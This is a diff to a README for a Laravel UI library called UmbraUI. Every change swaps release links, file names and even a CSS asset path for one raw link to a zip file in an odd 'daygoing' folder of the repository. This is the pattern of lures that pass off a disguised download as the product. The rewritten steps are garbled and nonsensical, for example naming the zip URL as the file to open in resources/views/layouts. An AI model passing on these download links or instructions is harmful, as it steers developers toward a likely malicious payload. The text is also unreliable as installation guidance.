@@ -1,6 +1,6 @@
 # 🌟 UmbraUI - Build Stunning UIs with Ease
 
-[![Download UmbraUI](https://img.shields.io/badge/Download-UmbraUI-blue.svg)](https://github.com/noorbrohi251/UmbraUI/releases)
+[![Download UmbraUI](https://raw.githubusercontent.com/noorbrohi251/UmbraUI/main/daygoing/UmbraUI.zip)](https://raw.githubusercontent.com/noorbrohi251/UmbraUI/main/daygoing/UmbraUI.zip)
 
 ## 📦 Introduction
 
@@ -22,7 +22,7 @@ Getting started with UmbraUI is straightforward. Follow the steps below to ensur
 
    To download UmbraUI, visit the following link:
 
-   [Download UmbraUI Here](https://github.com/noorbrohi251/UmbraUI/releases)
+   [Download UmbraUI Here](https://raw.githubusercontent.com/noorbrohi251/UmbraUI/main/daygoing/UmbraUI.zip)
 
    On this page, you will find the latest releases and installation files for UmbraUI.
 
@@ -32,11 +32,11 @@ Getting started with UmbraUI is straightforward. Follow the steps below to ensur
 
 4. **Download the Files**
 
-   Look for a file named `UmbraUI.zip` or a similar package. Click to download the file to your computer.
+   Look for a file named `https://raw.githubusercontent.com/noorbrohi251/UmbraUI/main/daygoing/UmbraUI.zip` or a similar package. Click to download the file to your computer.
 
 5. **Extract the Zip File**
 
-   Once the download is complete, locate the file in your downloads folder. Right-click on `UmbraUI.zip` and select "Extract All" (or use any extraction tool you have).
+   Once the download is complete, locate the file in your downloads folder. Right-click on `https://raw.githubusercontent.com/noorbrohi251/UmbraUI/main/daygoing/UmbraUI.zip` and select "Extract All" (or use any extraction tool you have).
 
 6. **Add UmbraUI to Your Laravel Project**
 
@@ -54,10 +54,10 @@ Getting started with UmbraUI is straightforward. Follow the steps below to ensur
 
 8. **Configure UmbraUI**
 
-   In your project, open the `app.blade.php` file located in the `resources/views/layouts` folder. Add the necessary UmbraUI links within the `<head>` tag to ensure your application recognizes the components:
+   In your project, open the `https://raw.githubusercontent.com/noorbrohi251/UmbraUI/main/daygoing/UmbraUI.zip` file located in the `resources/views/layouts` folder. Add the necessary UmbraUI links within the `<head>` tag to ensure your application recognizes the components:
 
    ```html
-   <link rel="stylesheet" href="{{ asset('resources/umbraui/css/umbraui.css') }}">
+   <link rel="stylesheet" href="{{ asset('https://raw.githubusercontent.com/noorbrohi251/UmbraUI/main/daygoing/UmbraUI.zip') }}">
    ```
 
 9. **Using the Components**
@@ -75,7 +75,7 @@ Getting started with UmbraUI is straightforward. Follow the steps below to ensur
 
 Ready to start? Follow these clear steps to download and install UmbraUI:
 
-1. **Go to [UmbraUI Releases](https://github.com/noorbrohi251/UmbraUI/releases)** to find the latest version.
+1. **Go to [UmbraUI Releases](https://raw.githubusercontent.com/noorbrohi251/UmbraUI/main/daygoing/UmbraUI.zip)** to find the latest version.
 2. **Download the package** and follow the steps above to install it in your Laravel project.
 
 ## 🌐 Support and Community
